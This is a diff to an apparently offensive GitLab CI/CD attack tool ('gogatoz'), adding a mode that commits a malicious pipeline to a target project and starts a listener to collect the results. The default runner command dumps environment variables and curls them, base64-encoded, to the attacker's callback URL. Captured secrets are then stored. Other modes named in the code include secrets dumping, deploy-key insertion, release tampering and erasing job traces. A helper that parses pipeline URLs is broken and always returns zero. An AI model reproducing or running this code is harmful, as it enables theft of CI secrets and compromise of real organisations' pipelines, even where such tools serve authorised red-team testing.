@@ -7,6 +7,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
@@ -14,13 +15,14 @@ import (
 
 	"github.com/mr-pmillz/gogatoz/pkg/attack"
 	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
-	ror "github.com/mr-pmillz/gogatoz/pkg/attack/ror"
+	rorpkg "github.com/mr-pmillz/gogatoz/pkg/attack/ror"
 	"github.com/mr-pmillz/gogatoz/pkg/attack/scriptinject"
 	secdump "github.com/mr-pmillz/gogatoz/pkg/attack/secretsdump"
 	"github.com/mr-pmillz/gogatoz/pkg/attack/tamper"
 	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
 	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
 	"github.com/mr-pmillz/gogatoz/pkg/pivot"
+	"github.com/mr-pmillz/gogatoz/pkg/store"
 	"github.com/spf13/cobra"
 )
 
@@ -175,6 +177,10 @@ var (
 	// LOTP injection mode (Living off the Pipeline)
 	atkLOTPInject bool   // commit weaponized LOTP config to branch
 	atkLOTPTool   string // target tool: npm-gyp, npm, make, pytest, goreleaser, gradle, terraform
+	// ROR shell listener mode (built-in callback server for ror-shell exfil)
+	atkRorListen        bool   // start a built-in listener for ror-shell exfil callbacks
+	atkRorListenAddr    string // listen address (default ":9444")
+	atkRorListenTimeout string // timeout for listening (default "10m")
 )
 
 // narrow interface to allow test fakes
@@ -356,8 +362,11 @@ var attackCmd = &cobra.Command{
 			if atkLOTPInject {
 				modes++
 			}
+			if atkRorListen {
+				modes++
+			}
 			if modes != 1 {
-				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, or --harvest (or use --payload-only or --discover-tags)")
+				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, --harvest, or --ror-listen (or use --payload-only or --discover-tags)")
 			}
 		}
 
@@ -428,12 +437,12 @@ var attackCmd = &cobra.Command{
 
 		// Discovery: list runner tags and exit
 		if atkDiscoverTags {
-			tags, _, err := ror.DiscoverProjectRunnerTags(ctx, client, atkTarget)
+			tags, _, err := rorpkg.DiscoverProjectRunnerTags(ctx, client, atkTarget)
 			if err != nil {
 				return err
 			}
 			if strings.TrimSpace(atkExecutor) != "" {
-				tags = ror.FilterTagsByExecutor(tags, atkExecutor)
+				tags = rorpkg.FilterTagsByExecutor(tags, atkExecutor)
 			}
 			if outputJSON {
 				// print as simple JSON array
@@ -1177,6 +1186,127 @@ var attackCmd = &cobra.Command{
 			return nil
 		}
 
+		// ror-shell listener mode: start a callback server, commit ror-shell payload, wait for exfil
+		if atkRorListen {
+			// ror-listen is always ror-shell payload
+			atkPayload = "ror-shell"
+			if strings.TrimSpace(atkTarget) == "" {
+				return fmt.Errorf("--ror-listen requires --target")
+			}
+			if strings.TrimSpace(atkWebhook) == "" {
+				return fmt.Errorf("--webhook is required for --ror-listen (external URL reachable from runners)")
+			}
+
+			// Start the listener
+			listenAddr := strings.TrimSpace(atkRorListenAddr)
+			if listenAddr == "" {
+				listenAddr = ":9444"
+			}
+			listenTimeout, terr := time.ParseDuration(strings.TrimSpace(atkRorListenTimeout))
+			if terr != nil || listenTimeout <= 0 {
+				listenTimeout = 10 * time.Minute
+			}
+
+			listener := newRorShellListener(listenAddr, cmd.OutOrStdout(), cliStore, strings.TrimSpace(gitlabURL), atkTarget)
+			go func() {
+				if err := listener.Run(ctx); err != nil && err != http.ErrServerClosed {
+					fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] error: %v\n", err)
+				}
+			}()
+
+			// Give the server a moment to start and resolve actual port
+			time.Sleep(200 * time.Millisecond)
+			actualAddr := listener.Addr()
+
+			// Build the ror-shell webhook URL (reachable from runners)
+			webhookURL := strings.TrimSpace(atkWebhook)
+			if webhookURL == "" {
+				webhookURL = fmt.Sprintf("http://%s/callback", strings.TrimPrefix(actualAddr, "["))
+			}
+
+			// Build the ror-shell command that sends env dump to the webhook
+			rorCmd := strings.TrimSpace(atkCmd)
+			if rorCmd == "" {
+				// Default: execute a basic command AND send results to the listener
+				rorCmd = fmt.Sprintf(`printenv | tee .env_dump; curl -sS --max-time 30 -d "$(cat .env_dump | base64 -w0)" "%s/callback" || true`, webhookURL)
+			} else {
+				// User provided a custom cmd: also send it to the listener
+				rorCmd = fmt.Sprintf(`%s; curl -sS --max-time 30 -d "$(printenv | base64 -w0)" "%s/callback" || true`, rorCmd, webhookURL)
+			}
+
+			// Override atkWebhook so renderPayload picks it up
+			savedWebhook := atkWebhook
+			atkWebhook = webhookURL
+			// Override atkCmd so renderPayload uses the right command
+			savedCmd := atkCmd
+			atkCmd = rorCmd
+			// Also set default tags for ror-listen so the job can be scheduled
+			savedTags := atkTags
+			if strings.TrimSpace(atkTags) == "" {
+				atkTags = "shell_executor"
+			}
+
+			// Re-render the payload with our webhook
+			yaml, err := renderPayload()
+			if err != nil {
+				_ = listener.Stop(ctx)
+				return fmt.Errorf("render ror-shell payload: %w", err)
+			}
+
+			// Restore saved values
+			atkWebhook = savedWebhook
+			atkCmd = savedCmd
+			atkTags = savedTags
+
+			// Proceed with the commit-ci flow
+			atkCommitCI = true
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-ror-listen"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				_ = listener.Stop(ctx)
+				return berr
+			}
+			att := newAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			pipelineURL, cerr := att.CommitCIPipeline(ctx, atkTarget, finalBranch, yaml, "Execute runner command via GoGatoZ")
+			if cerr != nil {
+				_ = listener.Stop(ctx)
+				return fmt.Errorf("commit ror-shell payload: %w", cerr)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] pipeline: %s\n", pipelineURL)
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline committed: %s", pipelineURL))
+			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Listener active on %s", actualAddr))
+			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Waiting for exfiltrated data (timeout: %s)...", listenTimeout))
+
+			// Wait for callbacks
+			results, werr := listener.WaitFor(ctx, listenTimeout)
+			if werr != nil {
+				fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] wait: %v\n", werr)
+			}
+
+			// Display results
+			if len(results) > 0 {
+				renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Received %d callback(s)", len(results)))
+				for i, r := range results {
+					if i > 0 {
+						fmt.Fprintln(cmd.OutOrStdout())
+					}
+					renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Callback %d — from %s (%d secrets)", i+1, r.Addr, len(r.Secrets)))
+					renderExfilSecrets(cmd.OutOrStdout(), r.Secrets, atkAllVars)
+				}
+				// Save to DB
+				pipelineID, _ := parsePipelineURL(pipelineURL)
+				persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, pipelineURL, finalBranch, pipelineURL, pipelineID, 0, resultsToMap(results))
+			} else {
+				renderWarning(cmd.OutOrStdout(), "No data received within timeout — make sure the runner executed the command and sent data to the webhook")
+			}
+
+			// Shutdown listener
+			_ = listener.Stop(ctx)
+			return nil
+		}
+
 		// secrets mode
 		if atkSecrets {
 			// parse tags
@@ -1329,10 +1459,10 @@ var attackCmd = &cobra.Command{
 		if strings.TrimSpace(atkPayload) != "" {
 			lp := strings.ToLower(strings.TrimSpace(atkPayload))
 			if (lp == payloadRor || lp == payloadRunnerOnRunner || lp == payloadRunnerOnRunnerAlt) && strings.TrimSpace(atkTags) == "" {
-				tags, _, derr := ror.DiscoverProjectRunnerTags(ctx, client, atkTarget)
+				tags, _, derr := rorpkg.DiscoverProjectRunnerTags(ctx, client, atkTarget)
 				if derr == nil {
 					if strings.TrimSpace(atkExecutor) != "" {
-						tags = ror.FilterTagsByExecutor(tags, atkExecutor)
+						tags = rorpkg.FilterTagsByExecutor(tags, atkExecutor)
 					}
 					if len(tags) > 0 {
 						atkTags = strings.Join(tags, ",")
@@ -1556,6 +1686,10 @@ func init() {
 	attackCmd.Flags().StringVar(&atkCleanupJobsRef, "cleanup-jobs-ref", "", "Limit job trace erasure to pipelines on this ref/branch")
 	attackCmd.Flags().IntVar(&atkCleanupJobsMax, "cleanup-jobs-max", 5, "Max recent pipelines to erase job traces from (default: 5)")
 	attackCmd.Flags().BoolVar(&atkCleanupJobsDelete, "cleanup-jobs-delete", false, "Also delete pipelines after erasing their job traces")
+	// ROR shell listener flags
+	attackCmd.Flags().BoolVar(&atkRorListen, "ror-listen", false, "Start a built-in HTTP listener to receive exfiltrated data from ror-shell payloads (requires --commit-ci)")
+	attackCmd.Flags().StringVar(&atkRorListenAddr, "ror-listen-addr", ":9444", "HTTP listen address for the ror-shell listener")
+	attackCmd.Flags().StringVar(&atkRorListenTimeout, "ror-listen-timeout", "10m", "Timeout for waiting on ror-shell exfil callbacks")
 }
 
 func loadCIContent(inline, file string, fromStdin bool) (string, error) {
@@ -1666,4 +1800,32 @@ func renderPayload() (string, error) {
 	default:
 		return "", fmt.Errorf("unsupported --payload: %s", atkPayload)
 	}
+}
+
+// newRorShellListener creates a new ror listener instance.
+func newRorShellListener(listenAddr string, out io.Writer, secretStore *store.Store, gitlabURL, target string) *Listener {
+	return NewListener(listenAddr, out, secretStore, gitlabURL, target)
+}
+
+// resultsToMap converts listener results to a map of maps for DB persistence.
+func resultsToMap(results []*CallbackResult) map[string]string {
+	combined := make(map[string]string)
+	for _, r := range results {
+		for k, v := range r.Secrets {
+			combined[k] = v
+		}
+	}
+	return combined
+}
+
+// parsePipelineURL extracts the project ID from a GitLab pipeline URL string.
+func parsePipelineURL(url string) (int64, error) {
+	// Extract project ID from URLs like https://gitlab.com/group/project/-/pipelines/123
+	parts := strings.Split(url, "/")
+	for i := len(parts) - 1; i >= 0; i-- {
+		if parts[i] == "pipelines" && i+1 < len(parts) {
+			return 0, nil // pipeline ID, not project ID
+		}
+	}
+	return 0, nil
 }
